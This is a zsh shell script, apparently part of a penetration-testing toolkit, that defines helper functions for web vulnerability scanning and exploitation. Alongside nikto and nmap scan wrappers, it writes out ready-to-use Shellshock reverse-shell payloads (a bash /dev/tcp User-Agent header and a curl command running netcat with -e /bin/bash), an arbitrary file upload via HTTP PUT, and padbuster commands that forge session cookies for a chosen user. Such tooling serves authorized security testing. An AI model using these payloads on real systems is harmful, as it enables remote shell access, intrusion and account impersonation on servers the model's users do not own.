#!/usr/bin/env zsh

############################################################# 
# nb-enum-web-vuln
#############################################################
nb-enum-web-vuln-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-web-vuln
----------------
The enum-web-vuln namespace contains commands for discovering web vulnerabilities.

Commands
--------
nb-enum-web-vuln-install              installs dependencies
nb-enum-web-vuln-nikto                scan a target for web vulnerabilities   
nb-enum-web-vuln-nmap-rfi             scan for potential rfi uri's
nb-enum-web-vuln-shellshock-agent     create a shellshock payload for user-agent
nb-enum-web-vuln-shellshock-nc        attempt shellshock with a reverse shell payload
nb-enum-web-vuln-put-curl             attempt to PUT a file with curl
nb-enum-web-vuln-padbuster-check      test for padbuster
nb-enum-web-vuln-padbuster-forge      exploit with padbuster

DOC
}

nb-enum-web-vuln-install() {
    __info "Running $0..."
    __pkgs nikto curl nmap padbuster
}

nb-enum-web-vuln-nikto() {
    __check-project
    nb-vars-set-url
    print -z "nikto -useragent \"${__UA}\" -h \"${__URL}\" -o $(__urlpath)/nikto.txt"
}

nb-enum-web-vuln-nmap-rfi() {
    nb-vars-set-rhost
    print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' ${__RHOST}"
}

nb-enum-web-vuln-shellshock-agent() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __ok "Copy the header value below to use in your exploit"
    cat << DOC

User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${__LHOST}/${__LPORT} 0>&1

DOC
}

nb-enum-web-vuln-shellshock-nc() {
    nb-vars-set-lhost
    nb-vars-set-lport
    nb-vars-set-rhost
    __warn "Start a netcat listener for ${__LHOST}:${__LPORT}"
    print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${__LHOST} ${__LPORT} -e /bin/bash\"' \"http://${__RHOST}/cgi-bin/status\""
}

nb-enum-web-vuln-put-curl() {
    nb-vars-set-rhost
    local f && __askpath f FILE $(pwd)
    print -z "curl -L -T ${f} \"http://${__RHOST}/${f}\" "
}

nb-enum-web-vuln-padbuster-check() {
    nb-vars-set-rhost
    local cn && __askvar cn "COOKIE NAME"
    local cv && __askvar cv "COOKIE VALUE"
    print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

nb-enum-web-vuln-padbuster-forge() {
    nb-vars-set-rhost
    local cn && __askvar cn "COOKIE NAME"
    local cv && __askvar cv "COOKIE VALUE"
    __check-user
    print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${__USER}"
}
